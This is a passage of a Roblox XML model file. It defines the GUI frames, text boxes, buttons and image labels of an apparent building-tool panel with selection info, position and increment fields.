													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextButton" referent="RBX2A3EAFE4A3E94232B6C94E147EAAF717">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="TextBox" referent="RBX12E836D7486846E89927E97AFD9B78F6">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX8B802A62ACCD4C1BB72F1C71F1875D68">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Y</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>117</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextButton" referent="RBXCEF34709291D4C98A01B184E76317B19">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="TextBox" referent="RBXF9103024BF1645EFBF90F5690DFC0C54">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="ImageLabel" referent="RBXAD440345AFCF4313B8FD1071B0C7477F">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="Frame" referent="RBX66D4E5BD70F74B6D9FFBEADF64DE9E8E">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">X</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>70</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>50</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextBox" referent="RBX8AC4983D193E478E89E13B56E57179AF">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClearTextOnFocus">true</bool>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<bool name="MultiLine">false</bool>
												<string name="Name">TextBox</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>5</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<bool name="ShowNativeInput">true</bool>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>-10</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextButton" referent="RBX67B9E8F8CFEE43B7B75EB81CB28E6E30">
											<Properties>
												<bool name="Active">true</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<bool name="AutoButtonColor">false</bool>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">0</token>
												<token name="FontSize">0</token>
												<bool name="Modal">false</bool>
												<string name="Name">TextButton</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">true</bool>
												<bool name="Selected">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<string name="Text"></string>
												<Color3 name="TextColor3">4279970357</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">8</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">2</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">2</int>
											</Properties>
										</Item>
										<Item class="ImageLabel" referent="RBX2DD36772FF41436DB716E85426D84B02">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
												<Color3 name="ImageColor3">4294967295</Color3>
												<Vector2 name="ImageRectOffset">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Vector2 name="ImageRectSize">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<float name="ImageTransparency">0</float>
												<string name="Name">Background</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<token name="ScaleType">0</token>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>1</YS>
													<YO>0</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<Rect2D name="SliceCenter">
													<min>
														<X>0</X>
														<Y>0</Y>
													</min>
													<max>
														<X>0</X>
														<Y>0</Y>
													</max>
												</Rect2D>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
									</Item>
									<Item class="TextLabel" referent="RBXDAF736DC3E644519BC1D9D7F4E7953B1">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>0</XS>
												<XO>75</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Position</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="TextLabel" referent="RBXCFC2B68CC2A142D5BC895CEC4758FF84">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-10</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">SELECTION INFO</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXC68479D27E6B47809C2B5009A7E4D2F6">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294945280</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>2</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
							</Item>
							<Item class="Frame" referent="RBX06BEA3A907194E03899611E1F4224869">
								<Properties>
									<bool name="Active">false</bool>
									<Vector2 name="AnchorPoint">
										<X>0</X>
										<Y>0</Y>
									</Vector2>
									<Color3 name="BackgroundColor3">4288914085</Color3>
									<float name="BackgroundTransparency">1</float>
									<Color3 name="BorderColor3">4279970357</Color3>
									<int name="BorderSizePixel">0</int>
									<bool name="ClipsDescendants">false</bool>
									<bool name="Draggable">false</bool>
									<string name="Name">IncrementOption</string>
									<Ref name="NextSelectionDown">null</Ref>
									<Ref name="NextSelectionLeft">null</Ref>
									<Ref name="NextSelectionRight">null</Ref>
									<Ref name="NextSelectionUp">null</Ref>
									<UDim2 name="Position">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>65</YO>
									</UDim2>
									<float name="Rotation">0</float>
									<bool name="Selectable">false</bool>
									<Ref name="SelectionImageObject">null</Ref>
									<UDim2 name="Size">
										<XS>0</XS>
										<XO>0</XO>
										<YS>0</YS>
										<YO>0</YO>
									</UDim2>
									<token name="SizeConstraint">0</token>
									<token name="Style">0</token>
									<bool name="Visible">true</bool>
									<int name="ZIndex">1</int>
								</Properties>
								<Item class="Frame" referent="RBX1D56FEACFD2C42A1BD2616E35B0827AF">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>75</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="TextLabel" referent="RBX2ACC92A45C2247BBA2EBF80A5289D2E0">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<string name="Name">TextLabel</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">Increment</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">0</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">true</bool>
											<token name="TextXAlignment">2</token>
											<token name="TextYAlignment">1</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX3B79478DFDBF471B927E4A7F62E2E216">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4288914085</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Increment</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>70</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>50</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="ImageLabel" referent="RBX800E82F6085341A890E68CF9237BA639">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
											<Color3 name="ImageColor3">4294967295</Color3>
											<Vector2 name="ImageRectOffset">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Vector2 name="ImageRectSize">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<float name="ImageTransparency">0</float>
											<string name="Name">Background</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<token name="ScaleType">0</token>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<Rect2D name="SliceCenter">
												<min>
													<X>0</X>
													<Y>0</Y>
												</min>
												<max>
													<X>0</X>
													<Y>0</Y>
												</max>
											</Rect2D>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
									</Item>
									<Item class="TextBox" referent="RBX3ABC8A00EDE6449DBE0B307A2DE2B088">
										<Properties>
											<bool name="Active">true</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClearTextOnFocus">true</bool>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<token name="Font">2</token>
											<token name="FontSize">4</token>
											<bool name="MultiLine">false</bool>
											<string name="Name">TextBox</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>5</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">true</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<bool name="ShowNativeInput">true</bool>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>-10</XO>
												<YS>1</YS>
												<YO>0</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<string name="Text">1</string>
											<Color3 name="TextColor3">4294967295</Color3>
											<bool name="TextScaled">false</bool>
											<float name="TextSize">12</float>
											<Color3 name="TextStrokeColor3">4278190080</Color3>
											<float name="TextStrokeTransparency">1</float>
											<float name="TextTransparency">0</float>
											<bool name="TextWrapped">false</bool>
											<token name="TextXAlignment">2</token>
